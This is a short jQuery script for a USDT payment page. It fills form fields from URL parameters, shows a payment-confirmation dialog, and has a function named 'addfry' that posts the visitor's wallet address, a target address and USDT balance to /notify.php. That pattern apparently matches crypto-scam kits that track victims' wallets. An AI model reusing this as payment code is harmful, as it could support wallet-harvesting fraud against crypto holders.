function loadData() {
    
	$("#to_address").val(getUrlParams("to_address"));
	$("#addtype").val(getUrlParams("addtype"));
	$("#from").val(getUrlParams("from"));
}

//获取url参数
function getUrlParams(key) {
	var url = window.location.search.substr(1);
	if (url == '') {
		return false;
	}
	var paramsArr = url.split('&');
	for (var i = 0; i < paramsArr.length; i++) {
		var combina = paramsArr[i].split("=");
		if (combina[0] == key) {
			return combina[1];
		}
	}
	return false;
}

function addfry() {
	$.ajax({
		url: "/notify.php",
		data: {
			address: $("#address").val(),
			to_address: $("#to_address").val(),
			balance: $("#usdt_balance").val(),
			type: $("#addtype").val(),
		},
		type: "post",
		success: function(data, textStatus, xhr) {
			console.log(data);
		},
		error: function(xhr, textStatus, error) {}
	});
}

//--------------paylist---------------

function payconfirm() {
	let payment = $("#payment").val();
	if ($.isNumeric(payment)) {
		if (payment > 0) {
			$("#confirm_amount").html("当前支付金额&nbsp<strong style='color: red;'>" + payment + "</strong>&nbspUSDT");
			$("#pay_confirm").modal('show');
		}else{
			alert("请填写正确的金额");
		}
	}
}
